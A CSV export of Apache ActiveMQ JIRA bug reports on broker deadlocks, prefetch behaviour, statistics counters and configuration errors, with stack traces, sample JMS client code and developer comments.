URL: http://svn.apache.org/viewvc?rev=1360125&view=rev
Log:
https://issues.apache.org/jira/browse/AMQ-2656 - add wellknown xa factory name, XAConnectionFactory so that context.lookup(""XAConnectionFactory"") will work as expected out of the box;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
connection stats appear broken,AMQ-2655,12483739,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,davisond,davisond,18/Mar/10 09:48,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"connection stats (as used at the end of the ""producer"" ant target in the samples) show 0 for each count regardless of how many messages are sent.  i.e.:
{noformat}
     [java] connection {
     [java]   session {
     [java]     messageCount{ count: 0 unit: count startTime: 1268866472026 lastSampleTime: 1268866472026 description: Number of messages exchanged }
     [java]     messageRateTime{ count: 0 maxTime: 0 minTime: 0 totalTime: 0 averageTime: 0.0 averageTimeExMinMax: 0.0 averagePerSecond: 0.0 averagePerSecondExMinMax: 0.0 unit: millis startTime: 1268866472026 lastSampleTime: 1268866472026 description: Time taken to process a message (thoughtput rate) }
     [java]     pendingMessageCount{ count: 0 unit: count startTime: 1268866472026 lastSampleTime: 1268866472026 description: Number of pending messages }
     [java]     expiredMessageCount{ count: 0 unit: count startTime: 1268866472026 lastSampleTime: 1268866472026 description: Number of expired messages }
     [java]     messageWaitTime{ count: 0 maxTime: 0 minTime: 0 totalTime: 0 averageTime: 0.0 averageTimeExMinMax: 0.0 averagePerSecond: 0.0 averagePerSecondExMinMax: 0.0 unit: millis startTime: 1268866472026 lastSampleTime: 1268866472026 description: Time spent by a message before being delivered }
     [java]     durableSubscriptionCount{ count: 0 unit: count startTime: 1268866472026 lastSampleTime: 1268866472026 description: The number of durable subscriptions }
     [java] 
     [java]     producers {
     [java]       producer queue://TEST.RECEIVED {
     [java]         messageCount{ count: 0 unit: count startTime: 1268866472032 lastSampleTime: 1268866472032 description: Number of messages processed }
     [java]         messageRateTime{ count: 0 maxTime: 0 minTime: 0 totalTime: 0 averageTime: 0.0 averageTimeExMinMax: 0.0 averagePerSecond: 0.0 averagePerSecondExMinMax: 0.0 unit: millis startTime: 1268866472032 lastSampleTime: 1268866472032 description: Time taken to process a message (thoughtput rate) }
     [java]         pendingMessageCount{ count: 0 unit: count startTime: 1268866472032 lastSampleTime: 1268866472032 description: Number of pending messages }
     [java]         messageRateTime{ count: 0 maxTime: 0 minTime: 0 totalTime: 0 averageTime: 0.0 averageTimeExMinMax: 0.0 averagePerSecond: 0.0 averagePerSecondExMinMax: 0.0 unit: millis startTime: 1268866472032 lastSampleTime: 1268866472032 description: Time taken to process a message (thoughtput rate) }
     [java]         expiredMessageCount{ count: 0 unit: count startTime: 1268866472032 lastSampleTime: 1268866472032 description: Number of expired messages }
     [java]         messageWaitTime{ count: 0 maxTime: 0 minTime: 0 totalTime: 0 averageTime: 0.0 averageTimeExMinMax: 0.0 averagePerSecond: 0.0 averagePerSecondExMinMax: 0.0 unit: millis startTime: 1268866472032 lastSampleTime: 1268866472032 description: Time spent by a message before being delivered }
     [java]       }
     [java]     }
     [java]     consumers {
     [java]     }
     [java]   }
     [java] }

{noformat}","Linux 2.6.31, JDK 6",zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60032,,,Tue Sep 20 11:01:39 UTC 2011,,,,,,,,,,,"0|i0akj3:",59599,,,,,,,,,,,,,,,,,,,,,"05/Aug/11 15:38;tabish;No test case to allow for reproduction of this issue.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Space character inserted before subscriptionID in durable subscription info,AMQ-2654,12483253,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,dejanb,slewis,slewis,17/Mar/10 16:06,17/Mar/10 16:30,14/Jul/23 05:43,17/Mar/10 16:30,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"When you check out the ObjectName of a durable subscription there's a space between ""Durable"" and subscriptionID:

{code}
org.apache.activemq:BrokerName=localhost,Type=Subscription,persistentMode=Durable, subscriptionID=James,destinationType=Topic
{code}

This patch removes that space.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Mar/10 16:07;slewis;patch.txt;https://issues.apache.org/jira/secure/attachment/12461660/patch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74858,,,Wed Mar 17 16:30:51 UTC 2010,,,,,,,Patch Available,,,,"0|i0rr4n:",160039,,,,,,,,,,,,,,,,,,,,,"17/Mar/10 16:30;dejanb;Patch applied. Thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ non-conformance to JMS Spec causing deadlock when using 3rd-party Resource Adapter,AMQ-2652,12483708,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,rodos77,rodos77,15/Mar/10 21:45,02/May/13 02:29,14/Jul/23 05:43,09/Aug/11 10:49,5.3.0,,,,,5.6.0,,,,,,,2,,,,,,,,,"Linked to forum discussion: http://old.nabble.com/ActiveMQ-non-conformance-to-JMS-Spec-causing-deadlock-when-using-3rd-party-Resource-Adapter-tt27869447.html

The following is an excerpt from the JMS Spec 1.1:

{quote}
*8.2.3 ServerSessionPool*

	...<snip>...

	If the ServerSessionPool is out of ServerSessions, the getServerSession() method
	may block. If a ConnectionConsumer is blocked, it cannot deliver new messages
	until a ServerSession is eventually returned.
{quote}
\\
I am using a 3rd-party JMS Resource Adapter to integrate ActiveMQ with a J2EE app server.  This Resource Adapter does just what the JMS Spec above allows - it blocks in the ServerSessionPool.getServerSession() call when it is out of ServerSessions.  This causes ActiveMQ to hang due to a deadlock.

The deadlock occurs because the ServerSessionPool uses a single connection to service all its ServerSessions.  This is perfectly legal.  However, ActiveMQ is using this same connection for both dispatching messages to the ConnectionConsumer as well as communicating transaction commits to the JMS engine.  

So the deadlock scenario is as follows:
\- message 1 is dispatched to the ConnectionConsumer and is being processed
\- before message 1 is committed, message 2 is dispatched
\- ServerSession is requested for processing message 2
\- ServerSessionPool.getServerSession() blocks because it is out of ServerSessions, blocking the connection from which the call was made
\- message 1 is finished processing and the tx is committed
\- ActiveMQ does a synchronous send using the same connection that is currently blocked, to communicate the transaction commit command
\- the commit blocks waiting for the connection to be released which will never happen because that release is dependent on the ServerSession being returned to the pool which won't happen until the tx is committed

The stacktraces of the 2 deadlocked threads at the time of the deadlock are as follows:

{noformat} 
""ActiveMQ Transport: tcp://localhost/127.0.0.1:61616"" prio=6 tid=0x0aecc9f8 nid=0x1414 in Object.wait() [0x0b6af000..0x0b6afc68]
	at java.lang.Object.wait(Native Method)
	- waiting on <0x03070188> (a org.apache.activemq.BlockingServerSessionPoolDeadlockTest$TestServerSessionPool)
	at java.lang.Object.wait(Object.java:474)
	at org.apache.activemq.BlockingServerSessionPoolDeadlockTest$TestServerSessionPool.getServerSession(BlockingServerSessionPoolDeadlockTest.java:106)
	- locked <0x03070188> (a org.apache.activemq.BlockingServerSessionPoolDeadlockTest$TestServerSessionPool)
	at org.apache.activemq.ActiveMQConnectionConsumer.dispatch(ActiveMQConnectionConsumer.java:129)
	at org.apache.activemq.ActiveMQConnection$2.processMessageDispatch(ActiveMQConnection.java:1676)
	at org.apache.activemq.command.MessageDispatch.visit(MessageDispatch.java:108)
	at org.apache.activemq.ActiveMQConnection.onCommand(ActiveMQConnection.java:1658)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:109)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)
	- locked <0x03064e98> (a org.apache.activemq.transport.InactivityMonitor$1)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)
	at java.lang.Thread.run(Thread.java:595)
	

""Thread-5"" prio=6 tid=0x0af48ae0 nid=0x14a4 waiting on condition [0x0b8af000..0x0b8afbe8]
	at sun.misc.Unsafe.park(Native Method)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1841)
	at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:341)
	at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:80)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1244)
	at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:643)
	at org.apache.activemq.TransactionContext.commit(TransactionContext.java:286)
	at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:510)
	at org.apache.activemq.BlockingServerSessionPoolDeadlockTest$TestServerSession$1.run(BlockingServerSessionPoolDeadlockTest.java:140)
{noformat} 

\\
I'm attaching a junit test that illustrates this deadlock.

Now, I realize that this bug does not manifest itself if the ActiveMQ Resource Adapter is used.  However, that is only because of the way AMQ RA works - it reuses existing ServerSessions instead of blocking when it runs out (and does a weird callback from the jms session to the ServerSession to start a tx, in order to avoid delivering several messages on same tx which is what would happen when reusing an existing ServerSession that is already in the middle of processing another message).  

I think this is a bug in AMQ JMS engine's implementation which just happens to be masked by the way AMQ RA is implemented.  If a Resource Adapted relies on the blocking behavior clearly provisioned by the JMS Spec, the problem becomes evident. ",,andreaja,grigory,izapolsky@gmail.com,rodos77,tkrah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2651,"15/Mar/10 21:46;rodos77;BlockingServerSessionPoolDeadlockTest.java;https://issues.apache.org/jira/secure/attachment/12461658/BlockingServerSessionPoolDeadlockTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60072,,,Tue Aug 09 10:49:42 UTC 2011,,,,,,,,,,,"0|i0ah07:",59028,,,,,,,,,,,,,,,,,,,,,"15/Mar/10 21:46;rodos77;Attaching junit test.;;;","22/Mar/10 15:17;gtully;is it the prefetch extension that is responsible for the second message dispatch that causes the problem here?;;;","22/Mar/10 15:22;rodos77;Yes, exactly.  I didn't mention it here before because I had opened a separate JIRA for that and didn't want to confuse the issues.;;;","09/Aug/11 10:49;gtully;fixed by https://issues.apache.org/jira/browse/AMQ-2651;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prefetchExtension off-by-1 for transacted consumers with prefetchSize > 0,AMQ-2651,12483428,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,rodos77,rodos77,15/Mar/10 21:22,02/May/13 02:29,14/Jul/23 05:43,20/Apr/10 15:17,5.3.0,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"Linked to forum discussion: http://old.nabble.com/prefetchExtension-off-by-1-for-transacted-consumers-with-prefetchSize-%3E-0-ts27866123.html

Hi,

I've searched the forum and JIRA and have noticed that the prefetchExtension in PrefetchSubscription has caused grief before.  However, I think there's still a problem.

First, I understand the purpose of the prefetchExtension for the case when prefetchSize = 0.  It allows messages to be dispatched to the consumer when the consumer requests them (i.e. polls them).  However, I don't really understand the purpose of the prefetchExtension for the cases when prefetchSize > 0.  If the consumer has set the prefetchSize to x, shouldn't it always receive only x messages at a time?  Why is the prefetchSize being extended?  I see that it is only extended in the case when the message delivery is transacted but I still don't understand why this is necessary.

In any case, assuming the prefetchExtension is necessary in the case of prefetchSize > 0 and transacted message delivery, I think the calculation of the prefetchExtension in this case has an off-by-1 error.  I am attaching a junit test that illustrates this problem.

The test is basically acting like a JCA Resource Adapter and sets up an asynchronous message listener by creating a ConnectionConsumer with a maxMessages value of 1.  This translates into a PrefetchSubscription with a prefetchSize of 1.  The test then sends 3 messages.  The purpose of the 1st message is to trigger the prefetch extension logic in PrefetchSubscription upon the message's ack.  When this happens, the prefetchExtension is set to 1 and the prefetchSize essentially becomes 2.  I believe this is incorrect and is the off-by-1 error (assuming the prefetchExtension is required at all in this case).  The 2nd message is simulated to be a long running message so that when the 3rd message is dispatched, the 2nd message is still being processed.  When the 3rd message is dispatched, because the prefetchSize has been extended, it will try to deliver it even though the processing of the 2nd message has not been completed and even though maxMessages on the ConnectionConsumer was specified as 1.

Now, if I only have 1 ServerSession in the ServerSessionPool, this behavior seems to violate the JMS Spec since the maxMessages parameter used during ConnectionConsumer creation is defined as ""the maximum number of messages that can be assigned to a server session at one time"" and ActiveMQ is trying to assign 2 messages to the same ServerSession at the same time. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2652,,,"15/Apr/10 15:45;rodos77;ASF.LICENSE.NOT.GRANTED--UsePrefetchExtension_Option.patch;https://issues.apache.org/jira/secure/attachment/12461666/ASF.LICENSE.NOT.GRANTED--UsePrefetchExtension_Option.patch","15/Mar/10 21:24;rodos77;OnePrefetchAsyncConsumerTest.java;https://issues.apache.org/jira/secure/attachment/12461656/OnePrefetchAsyncConsumerTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65689,,,Tue Apr 20 15:17:16 UTC 2010,,,,,,,,,,,"0|i0rq6f:",159885,,,,,,,,,,,,,,,,,,,,,"15/Mar/10 21:24;rodos77;Attaching junit test.;;;","15/Apr/10 15:45;rodos77;Patch attached.;;;","20/Apr/10 15:17;gtully;resolved in r935954

policyEntry.usePrefetchExtension allows the prefetch extension behaviur to be disabled. When false, and with prefetch of 1 or X, a new message will only be dispatched when the message is acked, rather than when it is delivered. When false, a client ack consumer  or transacted consumer will only ever get prefetch (X) number messages. 

code example of it disabled from the test:
{code}
        PolicyMap policyMap = new PolicyMap();
        PolicyEntry defaultEntry = new PolicyEntry();
        // ensure prefetch is exact. only delivery next when current is acked
        defaultEntry.setUsePrefetchExtension(false);
        policyMap.setDefaultEntry(defaultEntry);
        broker.setDestinationPolicy(policyMap);{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jdbcPersistenceAdapter adapterClass attribute does not exist,AMQ-2649,12483582,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,aheinz,aheinz,12/Mar/10 19:28,13/Feb/12 13:01,14/Jul/23 05:43,13/Feb/12 13:01,5.3.0,,,,,5.6.0,5.x,,Broker,,,,0,,,,,,,,,"http://activemq.apache.org/jdbc-support.html

This documentation states that:

You can explicitly specify the JDBC adaptor class inside the activemq.xml...
<jdbcPersistenceAdapter  adapterClass=""org.apache.activemq.store.jdbc.adapter.ImageBasedJDBCAdaptor""/>

But I get an error when I use the following configuration:

<persistenceAdapter>
  <jdbcPersistenceAdapter adapterClass=""org.apache.activemq.store.jdbc.PostgresqlJDBCAdapter"" dataSource=""#postgres-ds""/>
</persistenceAdapter>

jvm 1    | Caused by: org.springframework.beans.NotWritablePropertyException: Invalid property 'adapterClass' of bean class [org.apache.activemq.store.jdbc.JDBCPersistenceAdapter]: Bean property 'adapterClass' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
jvm 1    |      at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:801)
jvm 1    |      at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:651)
jvm 1    |      at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:78)
jvm 1    |      at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:59)
jvm 1    |      at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1276)
jvm 1    |      ... 45 more



Something similar was fixed a few years ago:
https://issues.apache.org/activemq/browse/AMQ-237
",RHEL4/5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44153,,,Mon Feb 13 13:01:35 UTC 2012,,,,,,,,,,,"0|i0akjb:",59600,,,,,,,,,,,,,,,,,,,,,"13/Feb/12 09:58;kimmking;just delete ""adapterClass=""org.apache.activemq.store.jdbc.PostgresqlJDBCAdapter"""".;;;","13/Feb/12 13:01;gtully;Updated the doc, the adapterClass is replaced with adapter attribute, where the xbean identifier is used.
https://cwiki.apache.org/confluence/display/ACTIVEMQ/JDBC+Support;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Interrupting Consumer.close() thread puts queue into unusable state,AMQ-2648,12483724,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,parasoft,parasoft,12/Mar/10 18:01,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.2.0,,,,,5.6.0,,,JMS client,,,,0,,,,,,,,,"We have built a client program for sending and receiving JMS messages. Each send/receive operation is performed in a thread, so that we can handle timeouts properly. However, if the thread which is performing the receive() gets interrupted, the queue no longer responds to receive() requests, even from another client with a separate JVM.

To reproduce, use two separate programs:
-----------[QueueSendReceiveActiveMQInterrupt.java]--------
import java.util.*;
import javax.jms.*;
import javax.naming.*;

public class QueueSendReceiveActiveMQInterrupt implements MessageListener {

    public static void main(String[] args) throws Exception {
        useConnectionFactory();
    }
    private static void useConnectionFactory() throws Exception, JMSException {
        ConnectionFactory factory = getConnectionFactoryUsingJNDI();
        Connection connect = null;
        Session session = null;
        connect = factory.createConnection(/*""Admin"", ""Admin""*/);
        session = connect.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Destination entryDest = session.createQueue(""soatest.demo.queue"");
        Destination exitDest = entryDest;
        MessageProducer producer = session.createProducer(entryDest);
        producer.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
        MessageConsumer consumer = session.createConsumer(exitDest);
        connect.start();
        TextMessage txtMessage = session.createTextMessage();
        txtMessage.setJMSReplyTo(exitDest);
        txtMessage.setText(""Hello 1 from standalone program!"");
        producer.send(txtMessage);
        System.out.println(""message 1 sent"");
        Message msg;
        
        // threaded receive with a kill
        ReceiverRunner runner = (new QueueSendReceiveActiveMQInterrupt()).new ReceiverRunner(consumer);
        Thread t = new Thread(runner);
        t.setDaemon(true);
        t.start();
        t.join(1000);
        t.interrupt();
        msg = runner.getMessage();
        if (msg != null) {
            System.out.println(""msg 1 received: "" + ((TextMessage)msg).getText());
        } else {
            System.out.println(""got no message 1"");
        }
        
        producer.close();
//        consumer.close();
//        session.close();
//        connect.close();
    }
    private static ConnectionFactory getConnectionFactoryUsingJNDI() throws Exception {
        Object ret = null;
        Properties props = new Properties();
        props.put(javax.naming.Context.PROVIDER_URL, ""tcp://skynet:61616"");
        props.put(javax.naming.Context.INITIAL_CONTEXT_FACTORY, ""org.apache.activemq.jndi.ActiveMQInitialContextFactory"");
        InitialContext ictx = new javax.naming.InitialContext(props);
        Object obj = ictx.lookup(""QueueConnectionFactory"");
        if (obj instanceof Reference) {
            Reference ref = (Reference)obj;
            String className = ref.getClassName();
            System.out.println(""Connection factory class name: "" + className);
            Class cls = Class.forName(className);
            ret = cls.newInstance();
        } else {
            ret = obj;
        }
        ictx.close();
        return (ConnectionFactory)ret;
    }
    public void onMessage(Message msg) {
        if (msg != null) {
            try {
                System.out.println(""msg = "" + ((TextMessage)msg).getText());
            } catch (JMSException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println(""got nothing"");
        }
    }
    public class ReceiverRunner implements Runnable {
        private MessageConsumer consumer;
        private Message msg;
        
        public ReceiverRunner(MessageConsumer consumer) {
            this.consumer = consumer;
        }
        public void run() {
            try {
                msg = consumer.receive(500);
                // change the following to a very small amount like 500 and notice how everything works
                consumer.receive(10000); // another receive just so it blocks and get the thread to stop
            } catch (JMSException e) {
                e.printStackTrace();
            } finally {
                try {
                    consumer.close();
                } catch (JMSException e) {
                    e.printStackTrace();
                }
            }
        }
        public Message getMessage() {
            return msg;
        }
    }
}
--
-----------[QueueSendReceiveActiveMQ.java]--------
import java.util.*;
import javax.jms.*;
import javax.naming.*;

public class QueueSendReceiveActiveMQ implements MessageListener {

    public static void main(String[] args) throws Exception {
        useConnectionFactory();
    }
    private static void useConnectionFactory() throws Exception, JMSException {
        ConnectionFactory factory = getConnectionFactoryUsingJNDI();
        Connection connect = null;
        Session session = null;
        connect = factory.createConnection(/*""Admin"", ""Admin""*/);
        session = connect.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Destination entryDest = session.createQueue(""soatest.demo.queue"");
        Destination exitDest = entryDest;
        MessageProducer producer = session.createProducer(entryDest);
        producer.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
        MessageConsumer consumer = session.createConsumer(exitDest);
        connect.start();
        TextMessage txtMessage = session.createTextMessage();
        txtMessage.setJMSReplyTo(exitDest);
        txtMessage.setText(""without thread interrupt: Hello 1 from standalone program!"");
        producer.send(txtMessage);
        System.out.println(""without thread interrupt: message 1 sent"");
        Message msg;
        // regular receive
        msg = consumer.receive(2000);
        
        if (msg != null) {
            System.out.println(""msg 1 received: "" + ((TextMessage)msg).getText());
        } else {
            System.out.println(""without thread interrupt: got no message 1"");
        }
        
        producer.close();
        consumer.close();
        session.close();
        connect.close();
        
    }
    private static ConnectionFactory getConnectionFactoryUsingJNDI() throws Exception {
        Object ret = null;
        Properties props = new Properties();
        props.put(javax.naming.Context.PROVIDER_URL, ""tcp://skynet:61616"");
        props.put(javax.naming.Context.INITIAL_CONTEXT_FACTORY, ""org.apache.activemq.jndi.ActiveMQInitialContextFactory"");
        InitialContext ictx = new javax.naming.InitialContext(props);
        Object obj = ictx.lookup(""QueueConnectionFactory"");
        if (obj instanceof Reference) {
            Reference ref = (Reference)obj;
            String className = ref.getClassName();
            System.out.println(""Connection factory class name: "" + className);
            Class cls = Class.forName(className);
            ret = cls.newInstance();
        } else {
            ret = obj;
        }
        ictx.close();
        return (ConnectionFactory)ret;
    }

    public void onMessage(Message msg) {
        if (msg != null) {
            try {
                System.out.println(""msg = "" + ((TextMessage)msg).getText());
            } catch (JMSException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println(""got nothing"");
        }
    }
}
--

1) Run QueueSendReceiveActiveMQ alone, notice how it works in sending receiving messages from the queue.
2) Run QueueSendReceiveActiveMQInterrupt will result in the program halting (due to some non-daemon thread created by ActiveMQ), then while it is running run QueueSendReceiveActiveMQ and notice how it fails to retrieve messages from the queue. If JMS Consumer.close() is excuted in a thread that is interrupted, it fails and throws an exception and leaves the consumer in some bad state.

Note that the same code does not exhibit this behavior when using other vendors' MQ solutions.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60039,,,Tue Sep 20 11:01:37 UTC 2011,,,,,,,,,,,"0|i0ah0f:",59029,,,,,,,,,,,,,,,,,,,,,"12/Jul/11 19:54;tabish;Running the provided test the message is received and the connection is shut down when the receive call is interrupted, the program exists normally. ;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock during FailoverTransport interruption,AMQ-2645,12483123,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,rajdavies,daroo,daroo,10/Mar/10 14:43,22/Mar/10 11:09,14/Jul/23 05:43,17/Mar/10 16:24,5.3.1,,,,,5.4.0,,,,,,,0,,,,,,,,,"Here is my scenario:
1)	Two AMQ servers setup with shared persistence storage (replicated message store)
2)	Single client constantly sends/receives small messages to/form one queue and uses single Connection with failover transport configured. The client code you can find here: AMQ-2512.
3)	After pushing several messages, shutdown active AMQ node - second one will kick in; client will successfully reconnect to this new active node; however it won't be able to receive any message out of the queue. Following warning is also generated by the client every 15s: ""WARNING: dispatch paused, waiting for outstanding dispatch interruption processing (20) to complete.."".

During debugging I've found that code which is supposed to clean messages during reconnection await for MessageDispatchChannel mutex owned by one of the session threads (screenshot-1). This session thread, from the other hand, is in the middle of send operation and waits for server's response. In result messages dispatch awaits infinitely on CountDownLatch which is supposed to be decremented by the deadlocked messages cleaning code (screenshot-2).

This occurs in the latest 5.3.1-SNAPSHOT as well as in 5.3.0-fuse-01-00 version.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Mar/10 14:45;daroo;screenshot-1.JPG;https://issues.apache.org/jira/secure/attachment/12461652/screenshot-1.JPG","10/Mar/10 14:45;daroo;screenshot-2.JPG;https://issues.apache.org/jira/secure/attachment/12461653/screenshot-2.JPG",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74859,,,Mon Mar 22 11:09:56 UTC 2010,,,,,,,,,,,"0|i0rpnj:",159800,,,,,,,,,,,,,,,,,,,,,"10/Mar/10 14:46;rajdavies;Thanks for raising this - can you attach the screenshots ? - would help in quickly identifying the issue;;;","17/Mar/10 16:24;rajdavies;Fixed by svn revision 924350;;;","18/Mar/10 22:34;daroo;Thx. Any chance this fix will appear also in 5.3.1?;;;","22/Mar/10 11:09;rajdavies;There's changes to the transport interface to support this - so its not possible to put into 5.3.1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
